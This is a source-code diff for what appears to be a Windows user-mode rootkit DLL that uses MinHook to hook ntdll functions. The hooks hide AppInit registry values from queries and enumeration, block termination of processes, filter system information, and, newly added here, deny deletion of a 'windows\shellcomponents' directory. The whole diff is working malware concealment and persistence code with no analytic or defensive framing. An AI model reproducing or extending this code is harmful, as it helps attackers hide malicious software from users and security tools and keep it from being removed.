@@ -58,7 +58,7 @@ bool ExplorerChild()
         e = getProcessName(ppid, fname, MAX_PATH);
         name = std::string(fname);
         pid = ppid;
-    } while (name.find("explorer") == std::string::npos);
+    } while (name.find("explorer") == std::string::npos); // TODO make it so it loads into explorer as well. good for testing now without.
 
     return ret;
 }
@@ -76,41 +76,13 @@ PWCHAR KeyValueInformationGetName(LPVOID keyValueInformation, NT_KEY_VALUE_INFOR
     }
 }
 
-// NTSTATUS WINAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFORMATION_CLASS keyInformationClass, LPVOID keyInformation, ULONG keyInformationLength, PULONG resultLength)
-// {
-//     NTSTATUS status = OriginalNtEnumerateKey(key, index, keyInformationClass, keyInformation, keyInformationLength, resultLength);
-//     OutputDebugStringA("called orig enum");
-
-//     // Implement hiding of registry keys by correcting the index in NtEnumerateKey.
-//     if (status == ERROR_SUCCESS && (keyInformationClass == KeyBasicInformation || keyInformationClass == KeyNameInformation))
-//     {
-//         OutputDebugStringW(L"in if");
-//         for (ULONG i = 0, newIndex = 0; newIndex <= index && status == ERROR_SUCCESS; i++)
-//         {
-//             OutputDebugStringW(L"in for");
-//             OutputDebugStringA(std::to_string(index).c_str());
-//             OutputDebugStringA(std::to_string(newIndex).c_str());
-//             OutputDebugStringA(std::to_string(i).c_str());
-//             status = OriginalNtEnumerateKey(key, i, keyInformationClass, keyInformation, keyInformationLength, resultLength);
-
-//             std::wstring name = std::wstring(KeyInformationGetName(keyInformation, keyInformationClass));
-//             OutputDebugStringW(name.c_str());
-//             if (name.find(L"AppInit") == std::wstring::npos)
-//             {
-//             	newIndex++;
-//             }
-//         }
-//     }
-
-//     return status;
-// }
-
 NTSTATUS WINAPI HookedNtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, NT_KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength)
 {
     if (ValueName->Length > 3)
     {
         std::wstring w_name = std::wstring(ValueName->Buffer);
-        if (w_name.find(L"Appinit") != std::wstring::npos || w_name.find(L"AppInit") != std::wstring::npos)
+        // std::transform(w_name.begin(), w_name.end(), ::tolower);
+        if (w_name.find(L"appinit") != std::wstring::npos) 
             return STATUS_OBJECT_NAME_NOT_FOUND;
     }
     return OriginalNtQueryValueKey(KeyHandle, ValueName, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
@@ -127,6 +99,7 @@ NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_
             status = OriginalNtEnumerateValueKey(key, i, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
 
             std::wstring name = std::wstring(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass));
+            // std::transform(w_name.begin(), w_name.end(), ::tolower);
             if (name.find(L"AppInit") == std::wstring::npos)
             {
                 newIndex++;
@@ -137,6 +110,19 @@ NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_
     return status;
 }
 
+NTSTATUS WINAPI HookedNtOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions)
+{
+    if (DesiredAccess & DELETE && ObjectAttributes->ObjectName->Length > 1)
+    {
+        std::wstring w_name = std::wstring(ObjectAttributes->ObjectName->Buffer);
+        // std::transform(w_name.begin(), w_name.end(), ::tolower);
+        if (w_name.find(L"windows\\shellcomponents") != std::wstring::npos) // no delete dir
+            return STATUS_ACCESS_DENIED;
+    }
+
+    return OriginalNtOpenFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
+}
+
 NTSTATUS WINAPI HookedNtTerminateProcess(HANDLE hProcess, UINT code)
 {
     OutputDebugStringA("in ntterminate");
@@ -145,18 +131,6 @@ NTSTATUS WINAPI HookedNtTerminateProcess(HANDLE hProcess, UINT code)
 
     return 1;
 }
-
-// NTSTATUS WINAPI HookedNtOpenProcess(
-//     PHANDLE ProcessHandle,
-//     ACCESS_MASK DesiredAccess,
-//     POBJECT_ATTRIBUTES ObjectAttributes,
-//     PCLIENT_ID ClientId)
-// {
-//     NTSTATUS status = OriginalNtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
-//     // return STATUS_ACCESS_DENIED;
-
-//     return status;
-// }
 
 NTSTATUS WINAPI HookedNtQuerySystemInformation(
     SYSTEM_INFORMATION_CLASS SystemInformationClass,
@@ -188,36 +162,17 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
 
 bool InstallHook()
 {
-    OutputDebugStringA("installing hook");
-    if (MH_Initialize() != MH_OK)
-    {
-        return false;
-    }
+    OutputDebugStringA("installing hooks");
+    if (MH_Initialize() != MH_OK) { return false; }
 
-    if (MH_CreateHookApi(L"ntdll", "NtQuerySystemInformation", reinterpret_cast<LPVOID *>(&HookedNtQuerySystemInformation), reinterpret_cast<LPVOID *>(&OriginalNtQuerySystemInformation)) != MH_OK)
-    {
-        return false;
-    }
-    if (MH_CreateHookApi(L"ntdll", "NtTerminateProcess", reinterpret_cast<LPVOID *>(&HookedNtTerminateProcess), reinterpret_cast<LPVOID *>(&OriginalNtTerminateProcess)) != MH_OK)
-    {
-        return false;
-    }
-    // if (MH_CreateHookApi(L"ntdll", "NtOpenProcess", reinterpret_cast<LPVOID *>(&HookedNtOpenProcess), reinterpret_cast<LPVOID *>(&OriginalNtOpenProcess)) != MH_OK)
-    // {
-    //     return false;
-    // }
-    if (MH_CreateHookApi(L"ntdll", "NtEnumerateValueKey", reinterpret_cast<LPVOID *>(&HookedNtEnumerateValueKey), reinterpret_cast<LPVOID *>(&OriginalNtEnumerateValueKey)) != MH_OK)
-    {
-        return false;
-    }
-    if (MH_CreateHookApi(L"ntdll", "NtQueryValueKey", reinterpret_cast<LPVOID *>(&HookedNtQueryValueKey), reinterpret_cast<LPVOID *>(&OriginalNtQueryValueKey)) != MH_OK)
-    {
-        return false;
-    }
-    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK)
-    {
-        return false;
-    }
+    if (MH_CreateHookApi(L"ntdll", "NtQuerySystemInformation", reinterpret_cast<LPVOID *>(&HookedNtQuerySystemInformation), reinterpret_cast<LPVOID *>(&OriginalNtQuerySystemInformation)) != MH_OK) { return false; }
+    if (MH_CreateHookApi(L"ntdll", "NtTerminateProcess", reinterpret_cast<LPVOID *>(&HookedNtTerminateProcess), reinterpret_cast<LPVOID *>(&OriginalNtTerminateProcess)) != MH_OK) { return false; }
+    if (MH_CreateHookApi(L"ntdll", "NtEnumerateValueKey", reinterpret_cast<LPVOID *>(&HookedNtEnumerateValueKey), reinterpret_cast<LPVOID *>(&OriginalNtEnumerateValueKey)) != MH_OK) { return false; }
+    if (MH_CreateHookApi(L"ntdll", "NtQueryValueKey", reinterpret_cast<LPVOID *>(&HookedNtQueryValueKey), reinterpret_cast<LPVOID *>(&OriginalNtQueryValueKey)) != MH_OK) { return false; }
+    if (MH_CreateHookApi(L"ntdll", "NtOpenFile", reinterpret_cast<LPVOID *>(&HookedNtOpenFile), reinterpret_cast<LPVOID *>(&OriginalNtOpenFile)) != MH_OK) { return false; }
+
+    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK) { return false; }
+
     return true;
 }
 
